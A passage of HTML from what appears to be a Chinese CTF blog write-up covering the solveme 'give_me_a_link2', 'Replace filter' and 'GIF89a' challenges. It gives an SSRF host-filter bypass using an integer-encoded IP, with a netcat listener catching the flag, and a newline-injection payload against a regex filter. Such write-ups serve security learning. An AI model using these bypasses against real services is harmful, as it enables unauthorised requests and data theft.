class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $host &#x3D; gethostbyname($parse[&#39;host&#39;]);</span><br><span class="line">        $port &#x3D; is_null($parse[&#39;port&#39;]) ? 80 : $parse[&#39;port&#39;];</span><br><span class="line"></span><br><span class="line">        if(socket_connect($socket, $host, $port) &#x3D;&#x3D;&#x3D; false)&#123;</span><br><span class="line">            die(&#39;Failed to connect&#39;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $send &#x3D; &quot;HEAD &#x2F;&quot;.$flag.&quot; HTTP&#x2F;1.1\r\n&quot;.</span><br><span class="line">            &quot;Host: &quot;.$host.&quot;:&quot;.$port.&quot;\r\n&quot;.</span><br><span class="line">            &quot;Connection: Close\r\n&quot;.</span><br><span class="line">            &quot;\r\n\r\n&quot;;</span><br><span class="line">        socket_write($socket, $send, strlen($send));</span><br><span class="line"></span><br><span class="line">        $recv &#x3D; socket_read($socket, 1024);var_dump($recv);</span><br><span class="line">        if(!preg_match(&#39;&#x2F;^HTTP\&#x2F;1.1 200 OK\r\n&#x2F;&#39;, $recv))&#123;</span><br><span class="line">            die(&#39;Not allowed response&#39;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        socket_close($socket);</span><br><span class="line"></span><br><span class="line">        echo &#39;Okay, I sent the flag.&#39;, &#39;&lt;hr&gt;&#39;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(__FILE__);</span><br></pre></td></tr></table></figure>
+<p>path中下划线'_'用无效字符绕过，关键就在于怎么绕过域名</p>
+<pre><code>if(!preg_match(&#39;/^(localhost|127\.\d+\.\d+\.\d+|[^.]+)(\:\d+)?$/i&#39;, $parse[&#39;host&#39;])){
+            die(&#39;Not allowed host&#39;);  </code></pre>
+<p>通常访问一个主机，可以使用域名，然后由dns解析成ip。其次是四组不大于256的数字表示Ip地址。再其次ip地址还可以用一个32位的大整数表示<br />
+http://www.msxindl.com/tools/ip/ip_num.asp<br />
+匹配<code>[^.]+</code>，加一个端口号就可以了<br />
+在虚拟主机上<code>nc -lvnp 8080</code><br />
+payload:<code>http://givemealink2.solveme.peng.kr/?url=http://{ip地址超大整数}{端口号}/plz%10give%10me</code></p>
+<h2 id="replace-filter">Replace filter</h2>
+<pre><code>&lt;?php
+    error_reporting(0);
+    require __DIR__.&#39;/lib.php&#39;;
+
+    if(isset($_GET[&#39;say&#39;]) &amp;&amp; strlen($_GET[&#39;say&#39;]) &lt; 20){
+
+        $say = preg_replace(&#39;/^(.*)flag(.*)$/&#39;, &#39;${1}&lt;!-- filtered --&gt;${2}&#39;, $_GET[&#39;say&#39;]);
+
+        if(preg_match(&#39;/give_me_the_flag/&#39;, $say)){
+            echo $flag;
+        }else{
+            echo &#39;What the f**k?&#39;;
+        }
+
+        echo &#39;&lt;hr&gt;&#39;;
+    }
+
+    highlight_file(__FILE__);</code></pre>
+<p><code>preg_replace('/^(.*)flag(.*)$/', '${1}&lt;!-- filtered --&gt;${2}', $_GET['say']);</code> <code>^</code>和<code>$</code>只匹配一行，实际上应该使用<code>/m</code>进行匹配多行<br />
+payload: <code>http://replacefilter.solveme.peng.kr/?say=%0agive_me_the_flag</code></p>
+<h2 id="gif89a">GIF89a</h2>
+<p>下载文件，在文件头假如GIF89a,修改后缀为gif,打开之后发现flag一闪而过，使用stegsolve.jar打开<br />
+<img src="http://or4d8nhvk.bkt.clouddn.com/2018-03-20-08-38-01-2018320.png" alt="2018-03-20-08-38-01-2018320" /><br />
+这些奇怪的字符我找了两天。。。。。。<br />
+这些字符无法使用输入法输入，这些都是word的特殊字符<br />
+<img src="http://or4d8nhvk.bkt.clouddn.com/2018-03-20-08-40-41-2018320.png" alt="2018-03-20-08-40-41-2018320" /> <img src="http://or4d8nhvk.bkt.clouddn.com/2018-03-20-08-43-38-2018320.png" alt="2018-03-20-08-43-38-2018320" /></p>
+<p>一开始我以为是flag{奇怪字符},后来发现flag是错的,我猜是浏览器编码问题，所以我决定使用burp发送，把那一堆特殊字符复制到burp里面的时候，flag格式出现了2333<img src="http://or4d8nhvk.bkt.clouddn.com/2018-03-20-08-46-46-2018320.png" alt="2018-03-20-08-46-46-2018320" /> 最后加一个<code>}</code>就可以了</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/ctf/" rel="tag"># ctf</a>
+              <a href="/tags/solveme/" rel="tag"># solveme</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2018/02/28/2018-2-28-xss-challenge/" rel="prev" title="XSS Challenges solution">
+      <i class="fa fa-chevron-left"></i> XSS Challenges solution
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2018/05/17/2018-5-17-leetcode-5-Longest-Palindromic-Substring/" rel="next" title="leetcode 5 Longest Palindromic Substring">
+      leetcode 5 Longest Palindromic Substring <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#solveme-writeup"><span class="nav-number">1.</span> <span class="nav-text">solveme writeup</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#warm-up"><span class="nav-number">1.1.</span> <span class="nav-text">Warm up</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#bad-compare"><span class="nav-number">1.2.</span> <span class="nav-text">Bad compare</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#winter-sleep"><span class="nav-number">1.3.</span> <span class="nav-text">Winter sleep</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hard-login"><span class="nav-number">1.4.</span> <span class="nav-text">Hard login</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#url-filtering"><span class="nav-number">1.5.</span> <span class="nav-text">URL filtering</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hash-collision"><span class="nav-number">1.6.</span> <span class="nav-text">Hash collision</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#array2string"><span class="nav-number">1.7.</span> <span class="nav-text">array2string</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#give-me-a-link"><span class="nav-number">1.8.</span> <span class="nav-text">give me a link</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#give_me_a_link2"><span class="nav-number">1.9.</span> <span class="nav-text">give_me_a_link2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#replace-filter"><span class="nav-number">1.10.</span> <span class="nav-text">Replace filter</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gif89a"><span class="nav-number">1.11.</span> <span class="nav-text">GIF89a</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Kele"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Kele</p>
+  <div class="site-description" itemprop="description">菜鸡</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">98</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">51</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/kele1997" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;kele1997" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:2363618563@qq.com" title="E-Mail → mailto:2363618563@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Kele</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">223k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">3:22</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+
+  <script src='https://cdnjs.cloudflare.com/ajax/libs/viz.js/1.7.1/viz.js'></script>
+  <script>
+    String.prototype.replaceAll = function(search, replacement) {
+      var target = this;
+      return target.split(search).join(replacement);
+    };
+
+    let vizObjects = document.querySelectorAll('.graphviz')
+
+    for (let item of vizObjects) {
+      let svg = undefined
+      try {
+        svg = Viz(item.textContent.replaceAll('–', '--'), 'svg')
+      } catch(e) {
+        svg = `<pre class="error">${e}</pre>`
+      }
+      item.outerHTML = svg
+    }
+  </script>
+
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
